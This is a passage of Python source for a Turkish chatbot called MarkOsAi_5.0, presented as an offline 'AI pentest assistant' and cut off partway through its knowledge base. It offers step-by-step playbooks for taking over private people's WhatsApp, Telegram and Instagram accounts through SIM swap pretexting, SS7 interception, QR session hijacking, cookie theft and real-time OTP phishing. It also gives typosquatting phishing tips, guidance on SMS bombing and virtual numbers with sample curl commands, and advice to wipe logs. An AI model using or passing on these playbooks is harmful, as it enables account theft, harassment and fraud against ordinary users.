#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════╗
║                 MarkOsAi_5.0 — AI PENTEST ASSISTANT          ║
║        HackerAI tarzı, tamamen OFFLINE AI asistanı           ║
║   Yetkili güvenlik testleri / eğitim amaçlıdır               ║
╚══════════════════════════════════════════════════════════════╝

ÖZELLİKLER:
  • 30+ konuda derin bilgi tabanı (TR + EN kelime skorlama)
  • Fuzzy eşleşme — soru tam bilinmese de en yakın konuyu bulur
  • Kod üretici: phishing kiti, keylogger, reverse shell, SMS bomber,
    SQLi fuzzer, OTP okuyucu, WhatsApp QR devralma, web shell, ...
  • Atak zinciri üretici (WhatsApp / Telegram / Instagram / Phishing / WiFi / Genel)
  • Araç + Kali komut önerileri
  • Web modu: --web → ağdaki herkes tarayıcıdan soru sorabilir
  • Konuşma hafızası (markos_memory.json) — öğrenir

KULLANIM:
  python3 markosai.py              → sohbet modu
  python3 markosai.py --web        → web modu (http://IP:8080)
  python3 markosai.py --port 9000  → farklı port

SOHBET KOMUTLARI:
  help | history | clear | exit
  kod üret <konu>  → çalışan kod üretir (örn: "kod üret whatsapp")
  plan <konu>      → atak zinciri (örn: "plan instagram")
  araç <konu>      → araç + Kali komutları (örn: "araç wifi")
"""

import os
import sys
import re
import time
import json
import random
import argparse
import threading
from datetime import datetime

# ═══════════════════════════ RENKLER ═══════════════════════════
R = "\033[0m"; B = "\033[1m"
RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
BLUE = "\033[94m"; MAGENTA = "\033[95m"; CYAN = "\033[96m"


def cprint(text, color=R, bold=False):
    print(f"{B if bold else ''}{color}{text}{R}")


def loading(text="İşleniyor", dur=0.6):
    for _ in range(3):
        for ch in "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏":
            print(f"\r{BLUE}{ch}{R} {text}...", end="", flush=True)
            time.sleep(0.05)
    print(f"\r{GREEN}✔{R} {text}.")


def clear():
    os.system("cls" if os.name == "nt" else "clear")


# ═══════════════════════════ ANA AI SINIFI ═══════════════════════════
class MarkOsAI:
    def __init__(self):
        self.memory = []
        self.memory_file = "markos_memory.json"
        self.lock = threading.Lock()
        self.KB = self._build_kb()
        self.CODE_LIB = self._build_code_lib()
        self.ATTACK_CHAINS = self._build_chains()
        self.load_memory()

    # ─────────────── HAFIZA (ÖĞRENME) ───────────────
    def load_memory(self):
        try:
            if os.path.exists(self.memory_file):
                with open(self.memory_file, "r", encoding="utf-8") as f:
                    self.memory = json.load(f)
        except Exception:
            self.memory = []

    def save_memory(self):
        try:
            with self.lock:
                with open(self.memory_file, "w", encoding="utf-8") as f:
                    json.dump(self.memory[-200:], f, ensure_ascii=False, indent=2)
        except Exception:
            pass

    def remember(self, q, intent):
        self.memory.append({
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "question": q,
            "intent": intent
        })
        self.save_memory()

    # ─────────────── NİYET (INTENT) ALGILAMA ───────────────
    def detect_intent(self, text):
        t = text.lower()
        scores = {}
        for topic, data in self.KB.items():
            s = 0
            for kw, w in data.get("keywords", []):
                if kw in t:
                    s += w
            if s > 0:
                scores[topic] = s
        if not scores:
            return None
        return max(scores, key=scores.get)

    # ─────────────── FUZZY EŞLEŞME (fallback) ───────────────
    def fuzzy_match(self, text):
        qw = set(re.findall(r"[a-zçğıöşü0-9]+", text.lower()))
        best, best_score = None, 0
        for k, d in self.KB.items():
            corpus = (d["title"] + " " + d["summary"] + " " + k).lower()
            words = set(re.findall(r"[a-zçğıöşü0-9]+", corpus))
            score = len(qw & words)
            if score > best_score:
                best, best_score = k, score
        return best if best_score >= 2 else None

    # ─────────────── CEVAP ÜRETİCİ ───────────────
    def answer(self, question):
        q = question.strip()
        ql = q.lower()

        # Özel komutlar
        if ql in ("exit", "quit", "q", "çık", "kapat"):
            return None
        if ql in ("help", "yardım", "komutlar", "yardim"):
            return self.help_text()
        if ql in ("clear", "temizle"):
            clear()
            return "[+] Bellek temizlendi (ekran)."
        if ql in ("history", "geçmiş", "hafıza", "gecmis"):
            return self.history_text()
        if ql in ("web", "web modu", "web server", "sunucu"):
            self.run_web()
            return "[+] Web modu kapandı."

        # Kod üretimi: "kod üret <konu>" / "code for <topic>"
        if "kod üret" in ql or "code for" in ql or "kod ver" in ql or "kod üret" in ql:
            topic = self._extract_topic_after(ql, ["kod üret", "code for", "kod ver"])
            return self.get_code(topic)
        if ql in ("kod", "code"):
            return "[!] Konu belirt: kod üret <konu>\n    Mevcut: " + ", ".join(self.CODE_LIB.keys())

        # Atak zinciri: "plan" / "akış" / "chain"
        if any(k in ql for k in ["plan", "akış", "zincir", "chain", "adım adım", "nasıl hack", "saldırı planı"]):
            topic = self.detect_intent(q) or self.fuzzy_match(q)
            if topic:
                return self.attack_chain(topic)

        # Araç önerisi
        if any(k in ql for k in ["araç", "arac", "tool", "hangi program", "komut ver", "kali", "komut öner"]):
            topic = self.detect_intent(q) or self.fuzzy_match(q)
            if topic:
                return self.tool_suggestions(topic)

        # Normal soru → bilgi tabanı
        intent = self.detect_intent(q) or self.fuzzy_match(q)
        self.remember(q, intent)
        if intent:
            return self.format_topic(intent)
        return self.fallback(q)

    @staticmethod
    def _extract_topic_after(text, prefixes):
        for p in prefixes:
            if p in text:
                return text.split(p, 1)[1].strip()
        return ""

    # ─────────────── FALLBACK ───────────────
    def fallback(self, q):
        return f"""{YELLOW}[MarkOsAi] Sorunu anladım ama bilgi tabanımda tam eşleşme bulamadım.{R}

{B}Deneyebileceğin konular:{R}
  • WhatsApp hack, Telegram hack, Instagram hack
  • OTP bypass, SIM swap, SS7, sanal numara / SMS hizmetleri
  • SMS bomber, phishing, sosyal mühendislik, OSINT
  • Şifre kırma, WiFi hack, SQLi, XSS
  • Reverse shell, privesc, keylogger, RAT, malware
  • Antivirüs bypass, anonimlik (Tor), MITM, DDoS
  • Metasploit, Nmap, Burp Suite, Hashcat, API/WebApp testi

{B}Komutlar:{R}
  "kod üret <konu>"  → çalışan kod üretir (kod üret reverse shell)
  "plan <konu>"      → atak zinciri (plan whatsapp)
  "araç <konu>"      → araç + Kali komutları (araç wifi)
  history | clear | exit"""

    def help_text(self):
        return f"""{CYAN}╔════════ MarkOsAi_5.0 KOMUTLAR ════════╗{R}
  {GREEN}help / yardım{R}        → Bu menü
  {GREEN}history / hafıza{R}    → Konuşma geçmişi
  {GREEN}clear / temizle{R}     → Ekranı temizle
  {GREEN}exit / çık{R}          → Sohbetten çık
  {GREEN}web{R}                 → Web modunu başlat (LAN'da herkes kullanır)

  {GREEN}kod üret <konu>{R}     → Çalışan kod (kod üret whatsapp / phishing / keylogger / reverse shell / sms ...)
  {GREEN}plan <konu>{R}         → Atak zinciri (plan instagram / wifi / phishing)
  {GREEN}araç <konu>{R}         → Araç + Kali komutları (araç sqlmap / nmap)

  {CYAN}Örnek sorular:{R}
  "whatsapp nasıl hacklenir" / "otp nasıl alınır"
  "telegram hesabı ele geçirme" / "sanal numara nereden alınır"
  "wifi şifresi kırma" / "sql injection nasıl yapılır"
  "keylogger nasıl yazılır" / "reverse shell nedir"
  "jwt token nasıl kırılır" / "burp suite ile web testi"
{CYAN}╚══════════════════════════════════════╝{R}"""

    def history_text(self):
        if not self.memory:
            return f"{YELLOW}[+] Henüz konuşma geçmişi yok.{R}"
        lines = [f"\n{B}{CYAN}Son {min(len(self.memory), 15)} soru:{R}"]
        for m in self.memory[-15:]:
            it = m["intent"] or "genel"
            lines.append(f"  [{m['time']}] {GREEN}{m['question'][:60]}{R} → {YELLOW}{it}{R}")
        return "\n".join(lines)

    # ─────────────── KONU FORMATLAYICI ───────────────
    def format_topic(self, topic):
        d = self.KB[topic]
        out = []
        out.append(f"\n{RED}{'═' * 58}{R}")
        out.append(f"{B}{RED}  🎯 {d['title']}{R}")
        out.append(f"{RED}{'═' * 58}{R}")
        out.append(f"\n{B}{CYAN}📌 Özet:{R}\n  {d['summary']}")
        out.append(f"\n{B}{YELLOW}🛠️  Araçlar:{R}")
        for t in d["tools"]:
            out.append(f"  • {t}")
        out.append(f"\n{B}{GREEN}📋 Adım Adım:{R}")
        for i, s in enumerate(d["steps"], 1):
            out.append(f"  {i}. {s}")
        if d.get("tips"):
            out.append(f"\n{B}{MAGENTA}💡 İpuçları:{R}")
            for t in d["tips"]:
                out.append(f"  → {t}")
        if d.get("code_key"):
            out.append(f"\n{B}{BLUE}⚙️  Örnek Kod:{R}\n  \"kod üret {d['code_key']}\" yazabilirsin.")
        out.append(f"\n{B}{RED}🛡️  Korunma:{R}\n  {d['mitigation']}")
        out.append(f"{RED}{'═' * 58}{R}")
        return "\n".join(out)

    # ─────────────── ARAÇ ÖNERİSİ ───────────────
    def tool_suggestions(self, topic):
        d = self.KB[topic]
        out = [f"\n{B}{GREEN}🛠️  {d['title']} — Araç & Komut Önerileri:{R}"]
        for i, t in enumerate(d["tools"], 1):
            out.append(f"  {i}. {t}")
        out.append(f"\n{B}{CYAN}💻 Kali Linux komut örnekleri:{R}")
        for c in d.get("commands", ["# İlgili araç için man sayfasına bak: man <araç>"]):
            out.append(f"  {YELLOW}$ {c}{R}")
        return "\n".join(out)

    # ─────────────── KOD ÜRETİCİ ───────────────
    def get_code(self, topic):
        t = topic.lower()
        mapping = {
            "whatsapp": "whatsapp_qr", "wa hack": "whatsapp_qr",
            "telegram": "telegram_session", "tg": "telegram_session",
            "sanal": "sms_services",
            "otp": "otp_reader", "kod oku": "otp_reader", "doğrulama": "otp_reader",
            "keylogger": "keylogger", "tuş": "keylogger",
            "phishing": "phishing_page", "fake": "phishing_page", "klon": "phishing_page", "oltalama": "phishing_page",
            "reverse": "reverse_shell", "shell": "reverse_shell", "backdoor": "reverse_shell", "ters": "reverse_shell",
            "wifi": "wifi_deauth", "deauth": "wifi_deauth",
            "sql": "sqli_fuzz", "sqli": "sqli_fuzz",
            "hashcat": "hashcat", "şifre": "hashcat", "password": "hashcat", "sifre": "hashcat",
            "nmap": "nmap", "tarama": "nmap", "scan": "nmap",
            "bomber": "sms_bomber", "bombardıman": "sms_bomber", "patlat": "sms_bomber", "flood sms": "sms_bomber",
            "sms": "sms_bomber",
            "hydra": "hydra", "brute": "hydra", "online brute": "hydra",
            "mitm": "mitm", "ettercap": "mitm", "arp": "mitm", "bettercap": "mitm",
            "ddos": "ddos", "flood": "ddos", "slowloris": "ddos", "dos": "ddos",
            "webshell": "web_shell", "upload": "web_shell", "web shell": "web_shell",
            "metasploit": "metasploit", "msf": "metasploit", "msfvenom": "metasploit",
            "privesc": "privesc", "linpeas": "privesc", "yetki yükselt": "privesc",
            "xss": "xss", "cookie çal": "xss",
            "evasion": "evasion", "bypass": "evasion", "amsi": "evasion",
        }
        key = None
        for k, v in mapping.items():
            if k in t:
                key = v
                break
        if not key:
            keys = ", ".join(self.CODE_LIB.keys())
            return f"{YELLOW}[!] Kod konusu bulunamadı. Mevcut kodlar:{R}\n  {keys}\n\n  Örnek: {GREEN}kod üret phishing{R}"
        code = self.CODE_LIB[key]
        return f"\n{B}{GREEN}═══ KOD: {key.upper()} ═══{R}\n\n{code}\n{B}{GREEN}{'═' * 40}{R}"

    # ─────────────── ATAK ZİNCİRİ ───────────────
    def attack_chain(self, topic):
        chain = self.ATTACK_CHAINS.get(topic)
        if not chain:
            for k, v in self.ATTACK_CHAINS.items():
                if k in topic:
                    chain = v
                    break
        if not chain:
            chain = self.ATTACK_CHAINS["generic"]
        out = [f"\n{B}{RED}🔥 ATAK ZİNCİRİ → {chain['title']}{R}",
               f"\n{B}Fazlar:{R}"]
        for i, phase in enumerate(chain["phases"], 1):
            out.append(f"\n{B}{CYAN}[FAZ {i}] {phase['name']}{R}")
            for step in phase["steps"]:
                out.append(f"   ▸ {step}")
        out.append(f"\n{B}{RED}⚠️  Başarı kriteri + temizlik:{R}\n   {chain.get('cleanup', 'Logları temizle, iz bırakma.')}")
        return "\n".join(out)

    # ─────────────── SOHBET ───────────────
    def interactive_chat(self):
        cprint("\n╔══════════════════════════════════════════╗", MAGENTA)
        cprint("║   MarkOsAi_5.0 — Sohbet Modu (AI)       ║", MAGENTA)
        cprint("║   'help' yaz → komutlar, 'exit' → çık   ║", MAGENTA)
        cprint("╚══════════════════════════════════════════╝\n", MAGENTA)
        while True:
            try:
                q = input(f"{CYAN}[SORU]{R} ").strip()
                if not q:
                    continue
                ans = self.answer(q)
                if ans is None:
                    print(f"{GREEN}[AI] Görüşürüz! Bellek kaydedildi.{R}")
                    break
                print(ans)
                print()
            except KeyboardInterrupt:
                print(f"\n{GREEN}[AI] Görüşürüz! Bellek kaydedildi.{R}")
                break

    # ─────────────── WEB MODU (herkes kullanabilsin) ───────────────
    def run_web(self, host="0.0.0.0", port=8080):
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
        import socket as _socket

        HTML = """<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>MarkOsAi_5.0 — Web</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0d1117;color:#c9d1d9;font-family:Consolas,monospace;display:flex;flex-direction:column;height:100vh}
header{background:#161b22;padding:14px 20px;border-bottom:1px solid #30363d;font-size:15px}
header b{color:#58a6ff}
#chat{flex:1;overflow-y:auto;padding:20px;display:flex;flex-direction:column;gap:10px}
.msg{max-width:85%;padding:10px 14px;border-radius:8px;white-space:pre-wrap;word-break:break-word;font-size:13px;line-height:1.5}
.user{align-self:flex-end;background:#1f6feb;color:#fff}
.ai{align-self:flex-start;background:#161b22;border:1px solid #30363d}
#bar{display:flex;gap:10px;padding:14px;background:#161b22;border-top:1px solid #30363d}
#q{flex:1;padding:12px;border-radius:6px;border:1px solid #30363d;background:#0d1117;color:#c9d1d9;font-size:14px}
#go{padding:12px 22px;border:none;border-radius:6px;background:#238636;color:#fff;font-weight:bold;cursor:pointer}
#go:hover{background:#2ea043}
</style>
</head>
<body>
<header><b>MarkOsAi_5.0</b> — soru sor, kod al, plan al. &nbsp;<span style="color:#8b949e">kod üret whatsapp · plan instagram · araç wifi</span></header>
<div id="chat"></div>
<div id="bar">
  <input id="q" placeholder="Sorunu yaz... (örn: whatsapp nasıl hacklenir)" autofocus>
  <button id="go" onclick="gonder()">Gönder</button>
</div>
<script>
const chat=document.getElementById('chat');
function add(t,who){
  const d=document.createElement('div');
  d.className='msg '+who;
  d.textContent=t;
  chat.appendChild(d);
  chat.scrollTop=chat.scrollHeight;
}
async function gonder(){
  const q=document.getElementById('q').value.trim();
  if(!q)return;
  add(q,'user');
  document.getElementById('q').value='';
  add('İşleniyor...','ai');
  try{
    const r=await fetch('/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({q})});
    const j=await r.json();
    chat.lastChild.remove();
    add(j.answer,'ai');
  }catch(e){chat.lastChild.remove();add('Hata: '+e,'ai')}
}
document.getElementById('q').addEventListener('keydown',e=>{if(e.key==='Enter')gonder()});
</script>
</body>
</html>"""

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                if self.path in ("/", "/index.html"):
                    body = HTML.encode("utf-8")
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html; charset=utf-8")
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)
                else:
                    self.send_response(404)
                    self.end_headers()

            def do_POST(self):
                if self.path == "/api":
                    ln = int(self.headers.get("Content-Length", 0))
                    try:
                        q = json.loads(self.rfile.read(ln).decode("utf-8")).get("q", "")
                    except Exception:
                        q = ""
                    ans = self.server.ai.answer(q) if q else "[!] Boş soru girdin."
                    if ans is None:
                        ans = "Görüşürüz!"
                    body = json.dumps({"answer": ans}, ensure_ascii=False).encode("utf-8")
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json; charset=utf-8")
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)
                else:
                    self.send_response(404)
                    self.end_headers()

        srv = ThreadingHTTPServer((host, port), Handler)
        srv.ai = self
        try:
            ip = _socket.gethostbyname(_socket.gethostname())
            cprint(f"[+] Web modu açık: http://{ip}:{port}", GREEN, True)
            cprint("[+] Ağdaki herkes bu adresi tarayıcıda açarak kullanabilir. (Ctrl+C durdurur)", CYAN)
            srv.serve_forever()
        except KeyboardInterrupt:
            cprint("\n[+] Web modu kapandı.", YELLOW)

    # ═══════════════════════════ BİLGİ TABANI ═══════════════════════════
    def _build_kb(self):
        return {
            "whatsapp": {
                "title": "WhatsApp Hesap Güvenlik Testi",
                "summary": "WhatsApp SMS OTP, Web QR, backup (crypt12) ve session token vektörleriyle test edilir.",
                "keywords": [("whatsapp", 6), ("whats app", 5), ("wa hack", 4), ("whatsapp hack", 6),
                             ("wp hack", 4), ("whatsapp nasıl", 5), ("whatsapp şifre", 5)],
                "tools": ["whatsapp-web.js", "Wireshark / tshark", "sqlite3 + Crypt12 decoder",
                          "Metasploit (auxiliary)", "SMS intercept araçları", "evilginx2 (2FA phishing)"],
                "steps": [
                    "Hedef numaranın WhatsApp'ta kayıtlı olup olmadığını doğrula (kayıt akışına sok, hata mesajına bak).",
                    "SMS OTP'yi yakala: SS7 intercept veya SIM swap ile doğrulama kodunu ele geçir.",
                    "WhatsApp Web QR hijack: QR'ı anlık yansıtan klon sayfa kur, kurban taratınca oturumu devral (whatsapp-web.js).",
                    "Backup analizi: msgstore.db.crypt12 dosyasını al, Crypt12 decrypt et; mesaj geçmişi + contact bilgisi çıkar.",
                    "Session/DB dosyalarını çek: wa.db, axolotl.db (signal keys) — yeni cihazda restore dene.",
                    "2 adımlı doğrulama varsa: e-posta hesabına eriş veya sosyal mühendislikle uygulama şifresini öğren.",
                ],
                "tips": ["WhatsApp OTP 6 haneli ve ~30sn geçerli; yakalayınca hemen kullan.",
                         "Voice OTP yedeği vardır — sesli aramayı da dinleme/kayıt vektörü olarak düşün.",
                         "whatsapp-web.js ile QR tabanlı oturum devralma en pratik vektördür: kod üret whatsapp"],
                "mitigation": "2 adımlı doğrulama + e-posta bildirimi, SIM PIN, şüpheli cihaz oturumlarını kontrol.",
                "commands": ["# WhatsApp numara kontrolü", "curl -s 'https://v.whatsapp.net/v2/exist/<numara>?cc=<ulke>'",
                             "# QR hijack test", "npm install whatsapp-web.js"],
                "code_key": "whatsapp_qr",
            },
            "telegram": {
                "title": "Telegram Hesap Güvenlik Testi",
                "summary": "Telegram MTProto, SMS giriş kodu, cloud şifre ve session dosyası vektörleriyle test edilir.",
                "keywords": [("telegram", 6), ("tg hack", 4), ("telegram hack", 5), ("telegram şifre", 5),
                             ("mtproto", 5), ("telegram hesabı", 5), ("telegram session", 5)],
                "tools": ["Telegram API / MTProto tools", "session.dat çıkarıcı", "Burp Suite (web app)",
                          "Brute force araçları (zayıf cloud şifre)", "Telethon"],
                "steps": [
                    "SMS giriş kodunu yakala: SS7 / SIM swap ile doğrulama kodunu ele geçir.",
                    "Telegram API'ye istek atarak rate-limit testi yap (5 haneli kod için brute force dene, limitleri ölç).",
                    "Cihazdan tdata/session dosyalarını çek, başka bir Telegram istemcisinde restore dene (telethon).",
                    "Cloud şifre zayıfsa: rockyou ile hashcat/John brute force dene.",
                    "Fake istemci veya erişilebilirlik servisi ile OTP bildirimini oku.",
                ],
                "tips": ["Telegram kodu 5 haneli; Android'de bildirimde görünür → NotificationListener ile okunabilir.",
                         "Session dosyası ele geçirilirse 2FA'ya takılmadan oturum açılır: kod üret telegram"],
                "mitigation": "Cloud şifre + 2FA, aktif oturum takibi, güçlü şifre.",
                "commands": ["pip install telethon", "# oturum listesi", "python3 -c \"from telethon.sync import TelegramClient; ...\""],
                "code_key": "telegram_session",
            },
            "instagram": {
                "title": "Instagram / Facebook Hesap Testi",
                "summary": "Şifre sıfırlama (SMS), session cookie ve bağlı oturumlar üzerinden test edilir.",
                "keywords": [("instagram", 6), ("ig hack", 4), ("insta", 4), ("instagram hack", 5),
                             ("facebook", 5), ("fb hack", 4), ("instagram şifre", 5)],
                "tools": ["Burp Suite", "BeEF (XSS hook)", "evilginx2 (2FA phishing)", "InstaBrute (eğitim)",
                          "Sherlock + Holehe (OSINT)"],
                "steps": [
                    "Şifre sıfırlama akışını test et: SMS / e-posta doğrulama kodunu yakalamayı dene.",
                    "Session cookie çal: XSS veya phishing ile c_user + xs cookie'lerini al, tarayıcıda kullan.",
                    "Bağlı hesapları keşfet: aynı e-posta/numara ile kayıtlı diğer platformları bul (osint).",
                    "2FA varsa: evilginx2 reverse-proxy ile gerçek zamanlı OTP yakala (simülasyon).",
                    "Kayıtlı oturumları hedefle: 'Bu cihazdan çıkış' yapılmamış eski session'ları dene.",
                ],
                "mitigation": "2FA (authenticator), aktif oturumları temizle, bilinmeyen cihaz uyarıları.",
                "commands": ["sherlock kullanici_adi", "holehe eposta@gmail.com", "whatweb -v https://www.instagram.com"],
                "code_key": "phishing_page",
            },
            "otp_bypass": {
                "title": "OTP / 2FA Bypass Teknikleri",
                "summary": "SMS tabanlı doğrulamanın zafiyet vektörleri: SS7, SIM swap, erişilebilirlik, forwarding, voice OTP.",
                "keywords": [("otp", 6), ("doğrulama kodu", 5), ("verification", 5), ("sms kodu", 5),
                             ("kod al", 4), ("kod yakala", 5), ("2fa", 5), ("iki adımlı", 4),
                             ("otp bypass", 7), ("2fa bypass", 6), ("sms intercept", 5)],
                "tools": ["SS7 test araçları", "SIM swap (operatör çağrısı)", "Android AccessibilityService",
                          "NotificationListenerService", "Yönlendirme kuralı (mail)", "evilginx2"],
                "steps": [
                    "SS7 intercept: SMS'in MAP protokolünde hedef numaraya giderken yakalanması (sinyalizasyon erişimi gerektirir).",
                    "SIM swap: Hedefin numarasını kendi SIM'ine taşıt (operatör manipülasyonu / sosyal mühendislik).",
                    "Erişilebilirlik servisi: Android'de OTP'yi okuyan kötü amaçlı uygulama (kullanıcı izniyle).",
                    "Bildirim dinleme: NotificationListenerService ile OTP bildirimini arka planda okuma.",
                    "Voice OTP: Sesli doğrulama aramasını dinleme/kaydetme (veya operatör sesli mesajına yönlendirme).",
                    "Yönlendirme: E-posta 2FA'sında forwarding kuralı oluşturma (hesap ele geçirilmişse).",
                    "Zayıf rate-limit: 6 haneli kod için sınırsız deneme → brute force (teorik, hedefe göre).",
                ],
                "tips": ["OTP yalnızca SMS'e bağlıysa risk yüksektir; TOTP (Google Authenticator) daha güvenli.",
                         "Android'de AccessibilityService ile OTP okuma: kod üret otp"],
                "mitigation": "TOTP / hardware key (YubiKey), SIM PIN, operatör port-out koruması, uygulama izinlerini kısıtla.",
                "commands": ["# Android OTP okuyucu (AccessibilityService)", "# Kotlin: kod üret otp ile gelir"],
                "code_key": "otp_reader",
            },
            "sim_swap": {
                "title": "SIM Swap Saldırısı",
                "summary": "Hedefin telefon numarasının saldırganın SIM'ine taşınmasıyla tüm SMS/arama trafiğinin ele geçirilmesi.",
                "keywords": [("sim swap", 7), ("sim değiş", 6), ("port out", 6), ("sim kart değişimi", 5),
                             ("sim swap saldırı", 7), ("numara taşıma", 4)],
                "tools": ["Telefon / sesli arama", "Operatör müşteri hizmetleri bilgileri (OSINT ile toplanır)"],
                "steps": [
                    "OSINT: Hedefin adı, kimlik bilgisi, adresi, operatörü hakkında bilgi topla (sosyal medya, sızıntı veritabanları).",
                    "Hedefin operatörünü ve hesap bilgilerini öğren (numara taşıma sorgusu).",
                    "Operatörü ara: kimlik bilgilerini vererek SIM değişikliği / port-out talep et (pretexting).",
                    "Yeni SIM aktif olunca hedefin tüm SMS/arama trafiğini al (OTP dahil).",
                    "Şifre sıfırlama akışlarını kullanarak hedef hesaplara gir.",
                ],
                "tips": ["Kurumsal hedeflerde sosyal mühendislik zorlaşır; operatör içi personel riski önemli.",
                         "Hedefin SIM'i kilitlenince fark edilir — hız kritik."],
                "mitigation": "Operatörde port-out PIN/PUK koruması, SIM PIN, banka/hesap bildirimleri.",
                "commands": ["# Numara taşıma sorgulama (TR)", "https://hat.kayitli.ktb.gov.tr (resmi)"],
                "code_key": "",
            },
            "ss7": {
                "title": "SS7 Sinyalizasyon Saldırıları",
                "summary": "Telekom çekirdek ağındaki SS7/Diameter protokol zafiyetleriyle SMS intercept, konum tespiti ve çağrı yönlendirme.",
                "keywords": [("ss7", 7), ("sinyalizasyon", 5), ("signaling", 5), ("diameter", 5), ("ss7 saldırı", 6)],
                "tools": ["SS7 test lab (OpenBSC / Osmocom)", "MAP protokol araçları", "Diameter simülatörleri"],
                "steps": [
                    "SS7 erişimi edin (yetkili test ortamında lab kur).",
                    "SendRoutingInfoForSM mesajı ile hedefin VLR/MSC bilgisini sorgula.",
                    "InsertSubscriberData / UpdateLocation mesajlarıyla SMS'i kendi MSC'ne yönlendir.",
                    "Gelen SMS'i yakala (OTP dahil), hedefe iletme (forward) kararı ver.",
                    "Konum tespiti: ProvideSubscriberInfo ile hücre/LA bilgisi çek.",
                ],
                "mitigation": "SS7/Diameter güvenlik duvarı (firewall), ağlar arası filtreleme, sinyal trafiği izleme.",
                "commands": ["# Osmocom kurulumu", "apt install osmocom-*", "# SS7 test (yetkili lab)"],
                "code_key": "",
            },
            "sms_services": {
                "title": "Sanal Numara / SMS Alma Hizmetleri",
                "summary": "Gerçek SMS alabilen çevrimiçi numara hizmetleri; doğrulama kodları bu numaralara düşer.",
                "keywords": [("sanal numara", 6), ("virtual number", 6), ("sms alma", 6), ("receive sms", 5),
                             ("sms-activate", 6), ("5sim", 6), ("smspool", 5), ("sahte numara", 4), ("sms hizmet", 5)],
                "tools": ["sms-activate.org", "5sim.net", "smspool.net", "textverified.com", "sms-man.com",
                          "getsmscode.com", "receive-smss.com", "temp-number.org"],
                "steps": [
                    "Hizmete kayıt ol, bakiye yükle (genelde ~$0.1-0.5 / numara).",
                    "Hedef platformu ve ülkeyi seç (WhatsApp TR numarası istiyorsa ülke=Türkiye seç).",
                    "Sana verilen numarayı hedef platforma kaydet (kayıt akışına sok).",
                    "Platform OTP'yi o numaraya gönderir → hizmet arayüzünde kodu gör.",
                    "Kodu gir, hesabı doğrula. Numara bir süre sonra tekrar kullanılabilir.",
                ],
                "tips": ["Bazı platformlar sanal numaraları engeller (WhatsApp özellikle VoIP/sanal hatları kısıtlar).",
                         "Fiyatlar ülke+platforma göre değişir; Türkiye numaraları genelde pahalıdır.",
                         "5sim API ile otomasyon: kod üret sanal"],
                "mitigation": "SMS 2FA yerine TOTP kullan; numara doğrulamada bilinmeyen hatlara dikkat.",
                "commands": ["# 5sim API örneği", "curl -H 'Authorization: Bearer API_KEY' https://5sim.net/v1/user/buy/activation/any/turkey/any/whatsapp"],
                "code_key": "sms_services",
            },
            "sms_bomber": {
                "title": "SMS Bomber / Stres Test",
                "summary": "Hedef numaraya yoğun SMS gönderimi; çoğunlukla açık form API'lerinin abuse edilmesiyle yapılır.",
                "keywords": [("sms bomber", 7), ("bombardıman", 5), ("sms patlat", 6), ("sms bomb", 6),
                             ("flood sms", 5), ("sms at", 4), ("sms gönder", 3)],
                "tools": ["curl / Python requests", "Açık SMS API'leri", "Tor + proxychains (anonimlik)"],
                "steps": [
                    "Hedef platformların SMS gönderim formlarını/API'lerini topla (recon).",
                    "Rate-limit olmayan veya zayıf doğrulamalı uçları belirle.",
                    "Oturum/captcha bypass yöntemlerini test et (API token, header spoof).",
                    "Çoklu isteği paralel gönder (threading) — stres testi olarak ölç.",
                    "Kendi numaranla test et; hedef ağırlıklı kullanım yasa dışıdır.",
                ],
                "mitigation": "API'lerde captcha + rate-limit, SMS sağlayıcı filtreleme, abonelik onayı.",
                "commands": ["# Hızlı test", "curl -X POST -d 'phone=HEDEF&msg=test' https://hedef-api.com/send"],
                "code_key": "sms_bomber",
            },
            "phishing": {
                "title": "Phishing / Oltalama Saldırıları",
                "summary": "Sahte login sayfası, e-posta/SMS oltası ve 2FA yakalayan reverse-proxy (evilginx2) teknikleri.",
                "keywords": [("phishing", 7), ("oltalama", 6), ("fake login", 5), ("sahte sayfa", 5),
                             ("clone", 4), ("klon sayfa", 4), ("sahte site", 4), ("login sayfası", 4)],
                "tools": ["SET (Social Engineering Toolkit)", "evilginx2 / muraena (2FA proxy)", "ngrok / Cloudflare (tunnel)",
                          "GoPhish (kampanya)", "BeEF"],
                "steps": [
                    "Hedef platformun login sayfasını klonla (SET veya manuel HTML).",
                    "Kimlik bilgilerini POST ile yakalayan backend hazırla (php/python).",
                    "Sayfayı internete aç: ngrok / localtunnel / VPS.",
                    "Kurbanı yönlendir: smishing (SMS), e-posta oltası, sosyal medya DM.",
                    "2FA varsa: evilginx2 ile reverse-proxy kur — kullanıcı OTP'yi girince sen de aynı anda yakala (gerçek zamanlı).",
                    "Logları topla: IP, User-Agent, şifre, OTP.",
                ],
                "tips": ["Gerçek URL yerine typosquatting (whatsapp-security.xyz) kullan.",
                         "HTTPS sertifikası şart — Let's Encrypt + tunnel ile ücretsiz.",
                         "Hazır çalışan kit: kod üret phishing"],
                "mitigation": "E-posta filtreleme, URL taraması, 2FA eğitimi, tarayıcı password manager uyarıları.",
                "commands": ["setoolkit", "evilginx2 -p phishing.yml", "ngrok http 80", "gophish"],
                "code_key": "phishing_page",
            },
            "social_engineering": {
                "title": "Sosyal Mühendislik",
                "summary": "Vishing, smishing, pretexting ve baiting ile insan faktörü üzerinden erişim elde etme.",
                "keywords": [("sosyal mühendislik", 7), ("social engineering", 6), ("vishing", 6), ("smishing", 6),
                             ("manipülasyon", 4), ("pretext", 4), ("insan faktörü", 5)],
                "tools": ["SET", "GoPhish", "Twilio (vishing test)", "Kali dahili araçlar"],
                "steps": [
                    "Hedef profili çıkar: iş yeri, rol, iletişim bilgileri (OSINT).",
                    "Senaryo kurgula: IT destek, kargo, banka güvenliği (pretexting).",
